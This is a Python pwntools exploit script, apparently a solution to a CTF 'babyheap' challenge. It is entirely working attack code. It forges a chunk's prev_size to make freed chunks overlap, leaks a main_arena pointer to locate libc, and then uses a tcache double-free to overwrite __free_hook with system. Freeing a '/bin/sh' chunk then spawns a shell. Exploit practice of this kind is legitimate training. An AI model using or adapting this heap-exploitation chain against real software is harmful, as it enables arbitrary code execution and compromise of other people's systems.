from pwn import *
elf = ELF('./babyheap.patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
p = elf.process()
def create(idx, sz, data):
    p.sendlineafter(b'>>', b'1')
    p.sendlineafter(b'Index:', b'%d' % idx)
    p.sendlineafter(b'Size:', b'%d' % sz)
    p.sendafter(b'Content:', b'%s' % data)
def delete(idx):
    p.sendlineafter(b'>>', b'2')
    p.sendlineafter(b'Index:', b'%d' % idx)
def view(idx):
    p.sendlineafter(b'>>', b'3')
    p.sendlineafter(b'Index:', b'%d' % idx)
    return p.recvline().strip().split(b' ')[-1]

create(10, 0xf8, b'AAAA')
create(11, 0x18, b'XXXX')
create(12, 0xf8, b'CCCC')

# fill up tcachebin size 0x100
for i in range(7):
    create(i, 0xf8, b'XXXX')
for i in range(7):
    delete(i)

# goes to unsortedbin
delete(10)

# overflow here, overwrite chunk 12 metadata prev_size + in_use flag
delete(11)
create(11, 0x18, b'A'*0x10 + p64(0x120)) # size of chunk 10 + chunk 11 => 0x100 + 0x20 => 0x120

# goes to unsortedbin, merged with chunk 10 overlapping chunk 11 in the middle
delete(12)

# refill
for i in range(7):
    create(i, 0xf8, b'XXXX')

# occupy new merged unsortedbin
create(10, 0xf8, b'XXXX')
leak_main_arena = u64(view(11).ljust(8, b'\x00'))
libc.address = leak_main_arena - 0x3ebca0
log.info("leak main_arena at 0x%x" % leak_main_arena)
log.info("libc base at 0x%x" % libc.address)

# occupy new merged unsortedbin, duplicate with chunk 11
create(12, 0x18, b'XXXX')

# occupy new merged unsortedbin, no more unsortedbin left
create(13, 0xf8, b'XXXX')

# tcache-dup -> tcache-poisoning -> __free_hook
# allocated and free dummy chunk to make tcache freelist >=1
delete(0)
create(0, 0x18, b'XXXX')
delete(0)

# double-free, freelist chunk point to itself
delete(11)
delete(12)

# the index order is doesn't matter, at least we need >=2 allocated chunk for tcache poisoning
create(11, 0x18, p64(libc.sym['__free_hook']))
create(0, 0x18, b'/bin/sh\x00')
create(12, 0x18, p64(libc.sym['system']))

# spawn shell
delete(0)
p.interactive()